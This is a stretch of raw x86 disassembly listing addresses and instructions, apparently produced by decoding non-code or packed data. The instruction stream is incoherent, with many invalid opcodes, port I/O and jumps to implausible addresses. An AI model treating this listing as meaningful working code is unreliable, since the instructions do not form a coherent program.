  414692:	je     0x4146c0
  414694:	shl    BYTE PTR [ebx-0x6c7acc03],cl
  41469a:	dec    ecx
  41469b:	mov    esi,0x28c35156
  4146a0:	and    BYTE PTR [eax+0x1e3ef3a1],dh
  4146a6:	sub    al,0xf6
  4146a8:	jmp    0xe0470350
  4146ad:	ficom  WORD PTR [ecx+0x28ee3b27]
  4146b3:	in     al,0xfb
  4146b5:	sbb    al,0xa6
  4146b7:	in     eax,0x51
  4146b9:	jl     0x414646
  4146bb:	xchg   ebx,eax
  4146bc:	pop    ecx
  4146bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146be:	imul   esi,DWORD PTR [edi],0xffffffce
  4146c1:	mov    ebp,0x391c9246
  4146c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146c7:	int3   
  4146c8:	js     0x414706
  4146ca:	repnz (bad) 
  4146cd:	test   esp,0xb3da92e1
  4146d3:	fcmovnbe st,st(3)
  4146d5:	sub    BYTE PTR [edi-0x54],bh
  4146d8:	or     ah,cl
  4146da:	xchg   esi,eax
  4146db:	xor    dh,0xd2
  4146de:	ret    
  4146df:	ds daa 
  4146e1:	or     al,0xdb
  4146e3:	jb     0x414758
  4146e5:	int    0xb9
  4146e7:	mov    ah,BYTE PTR [ebx+0x15]
  4146ea:	xor    BYTE PTR [eax+ebx*8-0x51bf0b8c],ah
  4146f1:	xchg   BYTE PTR [ebp+ebx*1-0x25440516],ch
  4146f8:	and    ah,BYTE PTR [edi]
  4146fa:	mov    bh,0xe6
  4146fc:	mov    ds:0xeaf978c1,al
  414701:	lods   al,BYTE PTR ds:[esi]
  414702:	dec    ebx
  414703:	pop    esp
  414704:	fistp  WORD PTR [ebp+0x3e]
  414707:	push   es
  414708:	popf   
  414709:	bound  ecx,QWORD PTR [esi+0x7da6c23a]
  41470f:	adc    eax,0x193b9d7d
  414714:	sub    DWORD PTR [edx],edi
  414716:	inc    ecx
  414717:	mov    al,ds:0xca38fdb2
  41471c:	(bad)  
  41471d:	data16 repz fmul st,st(7)
  414721:	adc    eax,0x1de6301e
  414726:	ss jmp 0x4146bf
  414729:	loope  0x41477e
  41472b:	dec    eax
  41472c:	scas   eax,DWORD PTR es:[edi]
  41472d:	push   ds
  41472e:	push   ecx
  41472f:	aaa    
  414730:	and    eax,0xd09166cd
  414735:	clc    
  414736:	mov    ch,BYTE PTR [eax+ebx*8-0x54]
  41473a:	test   eax,0xe2833749
  41473f:	xchg   ebx,eax
  414740:	(bad)  
  414741:	and    al,0x36
  414743:	mov    si,0xbe34
  414747:	cmc    
  414748:	mov    ch,0x65
  41474a:	sub    BYTE PTR ds:0x6d2733d7,ch
  414750:	loope  0x414733
  414752:	test   al,0x69
  414754:	and    eax,0x36ead6a
  414759:	sub    edx,DWORD PTR [ecx-0x477347ea]
  41475f:	jmp    0x7828:0xfa77c91e
  414766:	lock push ds
  414768:	cmp    eax,0x4f835b30
  41476d:	shr    DWORD PTR [eax-0x6bb97b3f],0x77
  414774:	sbb    eax,0xf6eccf78
  414779:	mov    edx,0x5420ded2
  41477e:	clc    
  41477f:	adc    al,0xb3
  414781:	mov    DWORD PTR [edi],0x7846af91
  414787:	jne    0x4147bc
  414789:	in     eax,0x98
  41478b:	mov    bh,0x7b
  41478d:	mov    ecx,0x2ebb95a7
  414792:	inc    edx
  414793:	mov    ah,0xda
  414795:	ret    0x3973
  414798:	pop    edx
  414799:	pop    eax
  41479a:	xchg   edx,eax
  41479b:	pop    eax
  41479c:	cmp    DWORD PTR [edx],esp
  41479e:	aas    
  41479f:	mov    eax,0x103e1c71
  4147a4:	mov    ecx,0xe372d187
  4147a9:	call   0xd76cbf85
  4147ae:	dec    esp
  4147af:	repz test esi,esi
  4147b2:	leave  
  4147b3:	pop    esp
  4147b4:	jb     0x4147fe
  4147b6:	pushf  
  4147b7:	jns    0x414811
  4147b9:	adc    BYTE PTR [esi-0x5],0x3c
  4147bd:	cmp    ah,dh
  4147bf:	pop    esp
  4147c0:	je     0x4147a9
  4147c2:	push   eax
  4147c3:	add    DWORD PTR [eax-0x19464fe],esi
  4147c9:	leave  
  4147ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147cb:	lds    ecx,FWORD PTR [eax-0x1f]
  4147ce:	out    dx,al
  4147cf:	jmp    0x414814
  4147d1:	jne    0x414768
  4147d3:	mov    dh,0xcc
  4147d5:	cli    
  4147d6:	lea    ebp,[ebp+0x38]
  4147d9:	aad    0x3b
  4147db:	xchg   edi,eax
  4147dc:	test   eax,0x285fcfb1
  4147e1:	cdq    
  4147e2:	add    al,0x14
  4147e4:	fistp  WORD PTR [eax+0x6f88deb4]
  4147ea:	push   esi
  4147eb:	aam    0xcd
  4147ed:	xchg   edx,eax
  4147ee:	ret    0x983c
  4147f1:	cmp    cl,BYTE PTR [ecx-0x5e947ad1]
  4147f7:	cdq    
  4147f8:	and    cl,bl
  4147fa:	imul   ebx,DWORD PTR [edi+0x716696f],0x1d588c66
  414804:	lods   al,BYTE PTR ds:[esi]
  414805:	(bad)  
  414806:	cmp    eax,0x89b92a1e
  41480b:	pop    ebx
  41480c:	sbb    dl,ah
  41480e:	ss aas 
  414810:	cdq    
  414811:	mov    ecx,0x1946101b
  414816:	stc    
  414817:	add    cl,BYTE PTR [esp+ebp*1+0xd]
  41481b:	(bad)  
  41481c:	jae    0x41485f
  41481e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41481f:	inc    ebp
  414820:	aaa    
  414821:	and    DWORD PTR ds:0xe521cc3c,edi
  414827:	add    esp,DWORD PTR [edi-0x7b]
  41482a:	js     0x414856
  41482c:	mov    eax,DWORD PTR [edi+0x44]
  41482f:	(bad)  
  414830:	rol    DWORD PTR [edi+0x12],cl
  414833:	fsub   DWORD PTR [edx-0x5e7d5f]
  414839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41483a:	inc    esi
  41483b:	call   0xf1c8:0xb0fcec9f
  414842:	push   ss
  414843:	iret   
  414844:	push   edx
  414845:	dec    esi
  414846:	sub    edx,edi
  414848:	mov    eax,0x8e539c58
  41484d:	stc    
  41484e:	sti    
  41484f:	mov    esp,0x33e766f3
  414854:	jge    0x41484a
  414856:	xchg   ecx,eax
  414857:	sbb    DWORD PTR [edx+0x23],eax
  41485a:	xor    eax,0xf01d1fd6
  41485f:	stos   DWORD PTR es:[edi],eax
  414860:	out    0x87,eax
  414862:	daa    
  414863:	sti    
  414864:	in     al,0xa2
  414866:	(bad)  
  414867:	or     al,0xfc
  414869:	psadbw mm3,QWORD PTR [edx+0x54]
  41486d:	mov    ch,0xda
  41486f:	add    cl,BYTE PTR [edi]
  414871:	pop    ecx
  414872:	iret   
  414873:	mov    cl,0x34
  414875:	mov    BYTE PTR [esi],0x5e
  414878:	xchg   ebx,eax
  414879:	sub    DWORD PTR [ebx],eax
  41487b:	in     al,dx
  41487c:	add    ebx,DWORD PTR [edi-0x6d]
  41487f:	fild   WORD PTR ds:0xc99c5be1
  414885:	jmp    0x4ad3c125
  41488a:	ds out 0x63,al
  41488d:	ret    
  41488e:	ds std 
  414890:	sub    BYTE PTR [edx-0x1e],0xc2
  414894:	push   edi
  414895:	sub    eax,0xf81d2ba
  41489a:	jl     0x4148c8
  41489c:	cmp    al,0x38
  41489e:	es in  eax,0x62
  4148a1:	and    BYTE PTR [esi-0x35],bh
  4148a4:	adc    al,ah
  4148a6:	test   al,0xb
  4148a8:	jae    0x414914
  4148aa:	pop    edx
  4148ab:	in     al,dx
  4148ac:	(bad)  
  4148ad:	push   ebp
  4148ae:	or     DWORD PTR [ecx-0x9],eax
  4148b1:	(bad)  
  4148b2:	lods   al,BYTE PTR ds:[esi]
  4148b3:	push   ebx
  4148b4:	mov    esi,0x3cb6d7f8
  4148b9:	out    dx,al
  4148ba:	pop    esi
  4148bb:	test   BYTE PTR [ecx+0x64af55ca],al
  4148c1:	add    edx,DWORD PTR [esi]
  4148c3:	scas   eax,DWORD PTR es:[edi]
  4148c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148c5:	aam    0x9f
  4148c7:	jae    0x4148a3
  4148c9:	add    eax,0x752016c8
  4148ce:	out    dx,eax
  4148cf:	dec    eax
  4148d0:	je     0x414935
  4148d2:	fwait
  4148d3:	mov    esp,0xf0418a82
  4148d8:	std    
  4148d9:	sub    DWORD PTR [ecx+0x5d],0xffffffa4
  4148dd:	fsub   DWORD PTR [edx+edi*8+0x11]
  4148e1:	dec    esp
  4148e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148e3:	cmp    edx,ebx
  4148e5:	xor    al,0x32
  4148e7:	shr    ebx,1
  4148e9:	stos   DWORD PTR es:[edi],eax
  4148ea:	jl     0x41495b
  4148ec:	mov    DWORD PTR [edi+0x27e58519],eax
  4148f2:	or     al,0xff
  4148f4:	dec    ebx
  4148f5:	mov    edx,0xb2274534
  4148fa:	mul    BYTE PTR [edi+ebx*4-0x78c8804d]
  414901:	adc    ah,BYTE PTR [esi]
  414903:	hlt    
  414904:	mov    eax,ds:0xfb91d385
  414909:	outs   dx,BYTE PTR ds:[esi]
  41490a:	popf   
  41490b:	rcl    DWORD PTR [ebx],0x7c
  41490e:	push   edx
  41490f:	fdiv   QWORD PTR [eax]
  414911:	int    0xd6
  414913:	(bad)  
  414914:	xor    eax,0xcc0dce60
  414919:	xor    BYTE PTR [ecx+0x7f],al
  41491c:	mov    esi,DWORD PTR [eax]
  41491e:	fs inc edx
  414920:	inc    ebp
  414921:	xor    ebx,DWORD PTR [edi]
  414923:	mov    al,0x8
  414925:	cmc    
  414926:	es xchg edi,eax
  414928:	imul   eax,DWORD PTR [bp+di-0x5ef6],0xfffffff3
  41492e:	sub    eax,0x43141fab
  414933:	cdq    
  414934:	mov    esp,0x787b8bcb
  414939:	pusha  
  41493a:	dec    ecx
  41493b:	lahf   
  41493c:	(bad)  
  41493d:	ficom  DWORD PTR [edx+0x465a680c]
  414943:	xor    edx,eax
  414945:	adc    ebp,DWORD PTR [ecx+0x64]
  414948:	daa    
  414949:	lock mov dh,0x29
  41494c:	inc    ecx
  41494d:	js     0x41498c
  41494f:	stos   BYTE PTR es:[edi],al
  414950:	data16 clc 
  414952:	idiv   edx
  414954:	or     bl,bh
  414956:	xchg   edx,eax
  414957:	cmp    ebx,0xb086dea6
  41495d:	adc    eax,0x539664ad
  414962:	push   ds
  414963:	push   ecx
  414964:	mov    ds:0xdafd7c30,eax
  414969:	and    ebp,ebx
  41496b:	jl     0x4149c3
  41496d:	ins    DWORD PTR es:[edi],dx
  41496e:	lea    edi,[ecx+0x43]
  414971:	repnz xchg ebx,eax
  414973:	test   eax,0xd9150bc3
  414978:	mov    DWORD PTR [ebx+0x67],edx
  41497b:	cmp    ecx,esi
  41497d:	enter  0x906,0x6d
  414981:	outs   dx,BYTE PTR ds:[esi]
  414982:	imul   DWORD PTR [edi+0x5ab22e3f]
  414988:	loop   0x414919
  41498a:	push   ebx
  41498b:	ds loopne 0x4149b5
  41498e:	mov    al,ds:0xa5c1eb5a
  414993:	jge    0x4149c0
  414995:	lahf   
  414996:	adc    BYTE PTR [esi+0x6b],bl
  414999:	cmp    al,0xe3
  41499b:	rcl    ecx,cl
  41499d:	int    0xc7
  41499f:	leave  
  4149a0:	mov    al,0x88
  4149a2:	add    edx,DWORD PTR [esi]
  4149a4:	dec    esi
  4149a5:	cwde   
  4149a6:	rol    BYTE PTR [ecx],0x12
  4149a9:	and    BYTE PTR [ecx],0xba
  4149ac:	cs (bad) 
  4149ae:	cmp    ecx,edi
  4149b0:	push   0x45
  4149b2:	push   edx
  4149b3:	loope  0x41499b
  4149b5:	arpl   sp,sp
  4149b7:	ja     0x414a0f
  4149b9:	(bad)  
  4149ba:	adc    al,0x4d
  4149bc:	fidiv  WORD PTR [ecx+0x7f]
  4149bf:	popf   
  4149c0:	dec    ebp
  4149c1:	cmp    BYTE PTR [edi+ebx*8-0x38],al
  4149c5:	mov    eax,0xbd44ca45
  4149ca:	lods   eax,DWORD PTR ds:[esi]
  4149cb:	in     eax,0xea
  4149cd:	sub    eax,DWORD PTR [edx-0x77]
  4149d0:	dec    ecx
  4149d1:	stos   DWORD PTR es:[edi],eax
  4149d2:	mov    dl,0x4c
  4149d4:	icebp  
  4149d5:	add    eax,0xa6d54d12
  4149da:	push   eax
  4149db:	repnz retf 
  4149dd:	and    DWORD PTR [edx],esi
  4149df:	jno    0x414989
  4149e1:	jns    0x414a09
  4149e3:	ins    DWORD PTR es:[edi],dx
  4149e4:	add    DWORD PTR gs:[edi-0x5ceadf42],eax
  4149eb:	sbb    dh,ah
  4149ed:	aam    0x15
  4149ef:	pop    ss
  4149f0:	fdivr  DWORD PTR [ecx-0x6a1e63c3]
  4149f6:	fstp   QWORD PTR [ebp+ecx*1+0x26f679a5]
  4149fd:	dec    eax
  4149fe:	sub    eax,DWORD PTR [eax-0x6525cd96]
  414a04:	stos   BYTE PTR es:[edi],al
  414a05:	call   0x12e69ebc
  414a0a:	adc    BYTE PTR [ebp-0x5427f9c],0x4b
  414a11:	push   ds
  414a12:	js     0x414a42
  414a14:	pop    ebx
  414a15:	cld    
  414a16:	and    al,0xc
  414a18:	push   ebx
  414a19:	jge    0x414a8f
  414a1b:	xchg   ebx,eax
  414a1c:	or     esp,edi
  414a1e:	test   eax,0x9392d616
  414a23:	in     eax,dx
  414a24:	dec    esi
  414a25:	xchg   ebx,eax
  414a26:	mov    dl,0x7b
  414a28:	mov    eax,DWORD PTR [ebp+0x59b308b]
  414a2e:	sub    bh,BYTE PTR ds:0x43efa503
  414a34:	out    dx,al
  414a35:	inc    edx
  414a36:	jp     0x4149fa
  414a38:	imul   ebp,DWORD PTR cs:[ebp+0x10],0xfffffff7
  414a3d:	out    0xdb,eax
  414a3f:	push   ds
  414a40:	and    DWORD PTR [edx-0x2dd83147],eax
  414a46:	jnp    0x4149fe
  414a48:	cli    
  414a49:	mov    al,ds:0x5889edbf
  414a4e:	shl    esi,1
  414a50:	ss push ss
  414a52:	sbb    dh,BYTE PTR [edx-0x71]
  414a55:	shl    DWORD PTR [edx],1
  414a57:	addr16 and al,0xd3
  414a5a:	jl     0x414a8d
  414a5c:	jbe    0x414a0b
  414a5e:	mov    cl,0xfc
  414a60:	test   DWORD PTR [ecx],ebx
  414a62:	push   edi
  414a63:	shr    ecx,1
  414a65:	fucomip st,st(0)
  414a67:	xchg   edi,eax
  414a68:	mov    eax,ebp
  414a6a:	xchg   ebx,eax
  414a6b:	in     al,0xaf
  414a6d:	fs nop
  414a6f:	pop    edx
  414a70:	xchg   DWORD PTR [ecx],eax
  414a72:	stos   BYTE PTR es:[edi],al
  414a73:	pop    edx
  414a74:	aaa    
  414a75:	icebp  
  414a76:	push   eax
  414a77:	lahf   
  414a78:	push   edi
  414a79:	push   eax
  414a7a:	jne    0x414a23
  414a7c:	popf   
  414a7d:	in     al,dx
  414a7e:	hlt    
  414a7f:	xor    al,0x2d
  414a81:	xchg   esp,eax
  414a82:	add    bl,BYTE PTR [edx+0x1b643156]
  414a88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a89:	inc    edx
  414a8a:	mov    esi,0x49730a86
  414a8f:	js     0x414a46
  414a91:	jle    0x414a15
  414a93:	jbe    0x414a49
  414a95:	jae    0x414ad2
  414a97:	jnp    0x414a1f
  414a99:	adc    esi,esp
  414a9b:	mov    ds:0xb38c7d8c,eax
  414aa0:	arpl   WORD PTR ds:0xdd664f83,di
  414aa6:	and    al,BYTE PTR [ecx+eax*2+0x25698d6b]
  414aad:	push   esi
  414aae:	adc    BYTE PTR [eax-0x192d21fd],bh
  414ab4:	or     ecx,edi
  414ab6:	mov    bh,0xec
  414ab8:	xor    ecx,edi
  414aba:	inc    esp
  414abb:	stc    
  414abc:	in     al,0x45
  414abe:	sub    al,ah
  414ac0:	mov    ebp,esp
  414ac2:	dec    esp
  414ac3:	neg    edx
  414ac5:	pusha  
  414ac6:	sar    BYTE PTR [ebp-0x5e],1
  414ac9:	bound  ebp,QWORD PTR [edx-0x3aa02281]
  414acf:	jmp    0x1c81:0x41febb7f
  414ad6:	jmp    0x414a5c
  414ad8:	sti    
  414ad9:	cmp    al,0x72
  414adb:	dec    edx
  414adc:	sbb    eax,0xd9501713
  414ae1:	frstor [edx+0x4c5ea9ca]
  414ae7:	cmp    esi,DWORD PTR [esi+0x291c39e5]
  414aed:	lahf   
  414aee:	aaa    
  414aef:	into   
  414af0:	push   ss
  414af1:	popf   
  414af2:	push   0xffffffe2
  414af4:	popa   
  414af5:	jle    0x414aea
  414af7:	mov    al,ds:0x8dc6c129
  414afc:	mov    ebp,0x2be3764c
  414b01:	mov    al,ah
  414b03:	aam    0x6
  414b05:	gs popa 
  414b07:	or     BYTE PTR [eax],bh
  414b09:	cmp    bh,BYTE PTR [esi-0x333de5b3]
  414b0f:	mov    cl,0xe2
  414b11:	(bad)  
  414b12:	std    
  414b13:	add    BYTE PTR ds:0x36326b63,0xe3
  414b1a:	mov    dh,0x5a
  414b1c:	sar    esp,0x7b
  414b1f:	clc    
  414b20:	lds    ebx,FWORD PTR [esp+eax*4-0x1fc117af]
  414b27:	fwait
  414b28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b29:	test   BYTE PTR [esi],ah
  414b2b:	ja     0x414b5d
  414b2d:	xor    al,0x5c
  414b2f:	jo     0x414ad1
  414b31:	dec    ecx
  414b32:	aam    0x8c
  414b34:	xchg   ebx,eax
  414b35:	push   esi
  414b36:	or     BYTE PTR [eax+eiz*2],cl
  414b39:	out    dx,al
  414b3a:	add    dh,BYTE PTR [edx-0x47]
  414b3d:	inc    edx
  414b3e:	add    eax,0x3bb27754
  414b43:	lea    eax,[ecx+0x617fe3fd]
  414b49:	sub    al,0xc3
  414b4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b4c:	adc    eax,0xef65cdd5
  414b51:	mov    ecx,0x491acd6c
  414b56:	popf   
  414b57:	call   0xc4305862
  414b5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b5d:	sub    DWORD PTR [edx-0x4aa7c090],ecx
  414b63:	jmp    0xb616:0xce202cd6
  414b6a:	xchg   ch,dl
  414b6c:	xor    eax,DWORD PTR [esi]
  414b6e:	leave  
  414b6f:	xchg   edi,eax
  414b70:	xchg   edi,eax
  414b71:	pop    edi
  414b72:	jmp    0x414ba3
  414b74:	int    0x9f
  414b76:	ret    
  414b77:	push   es
  414b78:	mov    bl,0xe7
  414b7a:	xchg   esi,eax
  414b7b:	(bad)  
  414b7d:	lock shl BYTE PTR [ebx+0x7f],0xa4
  414b82:	outs   dx,BYTE PTR ds:[esi]
  414b83:	fs loopne 0x414b9d
  414b86:	sub    ebp,DWORD PTR ds:0xa112b88
  414b8c:	les    esi,FWORD PTR [esi+0x5]
  414b8f:	popf   
  414b90:	sbb    dl,BYTE PTR [esi]
  414b92:	ror    BYTE PTR [esi+0x1c],1
  414b95:	fcomp  st(4)
  414b97:	imul   BYTE PTR [eax+ebp*8+0x5c]
  414b9b:	leave  
  414b9c:	fisub  WORD PTR ds:[eax-0x1beada4]
  414ba3:	adc    al,0x6b
  414ba5:	(bad)  
  414ba6:	scas   al,BYTE PTR es:[edi]
  414ba7:	out    0x4e,eax
  414ba9:	dec    esi
  414baa:	gs popa 
  414bac:	pop    ecx
  414bad:	in     al,dx
  414bae:	push   ecx
  414baf:	sbb    eax,0xaf2b360e
  414bb4:	push   0x1a
  414bb6:	cwde   
  414bb7:	pop    eax
  414bb8:	cmc    
  414bb9:	lds    eax,FWORD PTR [ebx+0x3]
  414bbc:	ror    DWORD PTR ds:0xf936d2b4,cl
  414bc2:	stc    
  414bc3:	xchg   esp,eax
  414bc4:	sbb    edi,DWORD PTR [ebp-0x19c3b67a]
  414bca:	out    dx,al
  414bcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bcc:	inc    edi
  414bcd:	loopne 0x414baa
  414bcf:	sahf   
  414bd0:	push   ebp
  414bd1:	jnp    0x414bef
  414bd3:	cmp    BYTE PTR [esi],bl
  414bd5:	inc    esp
  414bd6:	push   ecx
  414bd7:	nop
  414bd8:	jp     0x414bab
  414bda:	mov    ecx,edi
  414bdc:	ja     0x414bcc
  414bde:	je     0x414c47
  414be0:	cmp    dh,BYTE PTR [ecx-0x16d6c768]
  414be6:	fadd   st,st(3)
  414be8:	sti    
  414be9:	(bad)  
  414bea:	loop   0x414ba4
  414bec:	ret    0x27e7
  414bef:	leave  
  414bf0:	jge    0x414c52
  414bf2:	cwde   
  414bf3:	dec    esp
  414bf4:	sub    bl,0xfc
  414bf7:	cmp    al,0x2f
  414bf9:	inc    ecx
  414bfa:	xchg   DWORD PTR [eax+0x74],esi
  414bfd:	jb     0x414c36
  414bff:	mov    ds:0x90b1875e,eax
  414c04:	(bad)  
  414c05:	jg     0x414b95
  414c07:	mov    edi,0xd43a1a84
  414c0c:	sbb    al,0xad
  414c0e:	push   esp
  414c0f:	and    bh,BYTE PTR [edi]
  414c11:	sar    BYTE PTR [ebx-0x7b],1
  414c14:	jp     0x414ba6
  414c16:	mov    cl,0x31
  414c18:	in     eax,0xa8
  414c1a:	stc    
  414c1b:	retf   0xe339
  414c1e:	jecxz  0x414bcf
  414c20:	addr16 xchg ebx,eax
  414c22:	xchg   esi,eax
  414c23:	call   0x519778ae
  414c28:	dec    esi
  414c29:	cmp    BYTE PTR [ebp+0x1c],dl
  414c2c:	push   ss
  414c2d:	ins    BYTE PTR es:[edi],dx
  414c2e:	retf   
  414c2f:	xchg   esp,eax
  414c30:	sub    esp,ebx
  414c32:	xchg   edi,eax
  414c33:	xor    eax,ebp
  414c35:	rcr    BYTE PTR [ebp+0x2a],1
  414c38:	mov    BYTE PTR [ebp+0x1a2e42a6],cl
  414c3e:	cmp    DWORD PTR ds:0x41c09755,eax
  414c44:	cli    
  414c45:	adc    bl,BYTE PTR [esi]
  414c47:	int    0xa5
  414c49:	fcom   DWORD PTR [ebx]
  414c4b:	rol    DWORD PTR [esi],0x9e
  414c4e:	jnp    0x414beb
  414c50:	add    dh,al
  414c52:	mov    ?,WORD PTR [eax-0x2]
  414c55:	sbb    dl,BYTE PTR [esi-0x39ea8d36]
  414c5b:	stos   DWORD PTR es:[edi],eax
  414c5c:	aad    0xb1
  414c5e:	sbb    dh,BYTE PTR [ebp-0x52c7f022]
  414c64:	mov    bl,BYTE PTR [eax+0x49]
  414c67:	call   0xf1ad:0xc38024ad
  414c6e:	stos   BYTE PTR es:[edi],al
  414c6f:	push   ebp
  414c70:	sub    BYTE PTR [esi+0x11a3eb86],ch
  414c76:	in     eax,0xc6
  414c78:	xlat   BYTE PTR ds:[ebx]
  414c79:	ret    
  414c7a:	jno    0x414c0f
  414c7c:	test   eax,0x18b83622
  414c81:	dec    ebp
  414c82:	sbb    edi,DWORD PTR [ebp+ecx*1+0x1bc046a5]
  414c89:	repz cmp al,0x6e
  414c8c:	mov    ds:0xa559133f,al
  414c91:	lock call FWORD PTR [edx-0x2202fd50]
  414c98:	and    al,0x41
  414c9a:	xchg   ebp,eax
  414c9b:	out    dx,al
  414c9c:	xchg   BYTE PTR [ecx],cl
  414c9e:	imul   esi,esi,0xffffffd1
  414ca1:	clc    
  414ca2:	inc    ebp
  414ca3:	pop    ds
  414ca4:	nop
  414ca5:	pop    ds
  414ca6:	cmp    al,0xc1
  414ca8:	cdq    
  414ca9:	stos   BYTE PTR es:[edi],al
  414caa:	in     al,dx
  414cab:	inc    esi
  414cac:	adc    al,0x47
  414cae:	inc    ebp
  414caf:	aaa    
  414cb0:	mov    ds:0x88b0e507,eax
  414cb5:	je     0x414c37
  414cb7:	pushf  
  414cb8:	xor    BYTE PTR [eax-0x18],al
  414cbb:	gs jno 0x414cb3
  414cbe:	add    bl,ch
  414cc0:	push   edx
  414cc1:	cmp    bl,al
  414cc3:	mov    cl,0xf2
  414cc5:	jge    0x414ce0
  414cc7:	out    dx,al
  414cc8:	sub    edx,edx
  414cca:	scas   eax,DWORD PTR es:[edi]
  414ccb:	cmp    cl,bl
  414ccd:	pushf  
  414cce:	and    esp,ebx
  414cd0:	and    ecx,DWORD PTR [edx-0x30e38cfd]
  414cd6:	jbe    0x414cc9
  414cd8:	push   ds
  414cd9:	cmp    BYTE PTR [edx],dh
  414cdb:	cld    
  414cdc:	xor    DWORD PTR [ebx+0x5e],eax
  414cdf:	mov    dh,0x86
  414ce1:	add    eax,0x626e99e7
  414ce6:	aad    0x1
  414ce8:	jp     0x414ce4
  414cea:	stos   BYTE PTR es:[edi],al
  414ceb:	mov    ebp,0xb1345881
  414cf0:	ds out dx,eax
  414cf2:	ficomp WORD PTR [eax]
  414cf4:	pop    ebp
  414cf5:	inc    esp
  414cf6:	in     eax,dx
  414cf7:	sub    dl,0x65
  414cfa:	and    edx,esp
  414cfc:	lods   eax,DWORD PTR ds:[esi]
  414cfd:	in     eax,dx
  414cfe:	mov    bl,0x39
  414d00:	dec    eax
  414d01:	(bad)  [ebx+0x15]
  414d04:	lods   eax,DWORD PTR fs:[esi]
  414d06:	mov    ?,WORD PTR [ebp-0x197b510f]
  414d0c:	jg     0x414d24
  414d0e:	sbb    esp,DWORD PTR [eax+0x14]
  414d11:	cmp    eax,DWORD PTR [edi]
  414d13:	out    dx,al
  414d14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d15:	dec    ebp
  414d16:	outs   dx,DWORD PTR ds:[esi]
  414d17:	pop    esp
  414d18:	pop    esp
  414d19:	or     ebp,DWORD PTR [edi-0x64f5fe8d]
  414d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d20:	mov    eax,esi
  414d22:	pop    ds
  414d23:	(bad)  [ebx+eax*8+0x6ad7dc64]
  414d2a:	not    BYTE PTR [ecx+0x64072f41]
  414d30:	test   eax,0xb9c53c71
  414d35:	loop   0x414d4e
  414d37:	sub    BYTE PTR [eax+ecx*8+0x569f058d],bl
  414d3e:	cld    
  414d3f:	aas    
  414d40:	out    dx,eax
  414d41:	cs dec esp
  414d43:	xchg   ebp,ebx
  414d45:	jge    0x414d95
  414d47:	loop   0x414cdc
  414d49:	jo     0x414d2a
  414d4b:	xchg   esp,eax
  414d4c:	mov    ebx,0xd5dc2ded
  414d51:	cmp    al,0x2c
  414d53:	lea    edi,[edx]
  414d55:	mov    ebp,DWORD PTR [ebp-0x28]
  414d58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d59:	pushf  
  414d5a:	test   al,0x71
  414d5c:	xor    BYTE PTR [edx],bl
  414d5e:	xlat   BYTE PTR ds:[ebx]
  414d5f:	jl     0x414ce6
  414d61:	icebp  
  414d62:	push   ecx
  414d63:	lock and DWORD PTR [eax+eax*1],esi
  414d67:	mov    bh,0xe2
  414d69:	test   BYTE PTR [edi],ah
  414d6b:	dec    ebp
  414d6c:	mov    ds:0xd44cc0e8,eax
  414d71:	aaa    
  414d72:	xor    eax,0x8c37f259
  414d77:	push   ss
  414d78:	out    0x7f,al
  414d7a:	mov    BYTE PTR [edx-0x71],bh
  414d7d:	jecxz  0x414d5c
  414d7f:	mov    dl,0x34
  414d81:	dec    edi
  414d82:	test   BYTE PTR [edx+0x34],0x76
  414d86:	retf   
  414d87:	add    al,0x57
  414d89:	in     al,0xf5
  414d8b:	hlt    
  414d8c:	addr16 pusha 
  414d8e:	cmc    
  414d8f:	lods   eax,DWORD PTR ds:[esi]
  414d90:	sbb    eax,eax
  414d92:	add    BYTE PTR [eax-0x4],0x44
  414d96:	enter  0xc233,0x7a
  414d9a:	push   cs
  414d9b:	adc    eax,0x1e494bc8
  414da0:	outs   dx,DWORD PTR ds:[esi]
  414da1:	mov    WORD PTR [ebx-0x6d],ds
  414da4:	call   0x3c6bc1f9
  414da9:	pop    edi
  414daa:	xchg   esi,eax
  414dab:	sahf   
  414dac:	ud0    edx,ecx
  414daf:	call   0x78bcf9ad
  414db4:	inc    ebx
  414db5:	call   0x4539:0x73615547
  414dbc:	xor    ch,bh
  414dbe:	mov    bh,0xee
  414dc0:	idiv   DWORD PTR [ecx+ecx*4+0x25cda5db]
  414dc7:	inc    esi
  414dc8:	lahf   
  414dc9:	call   0x17791ea5
  414dce:	cli    
  414dcf:	push   DWORD PTR [edx]
  414dd1:	sbb    BYTE PTR [esi-0x5b1dd3ae],bh
  414dd7:	cmp    ch,BYTE PTR [edi]
  414dd9:	out    0xf1,eax
  414ddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ddc:	in     al,dx
  414ddd:	lds    eax,FWORD PTR [ecx]
  414ddf:	int    0xf6
  414de1:	bound  edx,QWORD PTR [edx+0x79]
  414de4:	and    ebx,DWORD PTR [edi+0x29]
  414de7:	icebp  
  414de8:	mov    ebp,0x909a7bcc
  414ded:	xor    eax,0x5816cf0f
  414df2:	pop    esp
  414df3:	push   ss
  414df4:	out    dx,eax
  414df5:	jmp    0x8dbb50ca
  414dfa:	mov    dh,0xff
  414dfc:	cmp    BYTE PTR [esi+ebp*2],dl
  414dff:	adc    DWORD PTR [ecx],ebp
  414e01:	mov    ch,0x19
  414e03:	std    
  414e04:	jle    0x414d8d
  414e06:	dec    eax
  414e07:	mov    bh,0xa3
  414e09:	cld    
  414e0a:	call   0xba71d0b
  414e0f:	inc    edx
  414e10:	sbb    al,0xf5
  414e12:	pop    edi
  414e13:	xchg   esi,eax
  414e14:	daa    
  414e15:	(bad)
  414e18:	or     al,0x66
  414e1a:	push   edx
  414e1b:	es jb  0x414dd5
  414e1e:	stos   BYTE PTR es:[edi],al
  414e1f:	retf   0x3d74
  414e22:	cli    
  414e23:	inc    esp
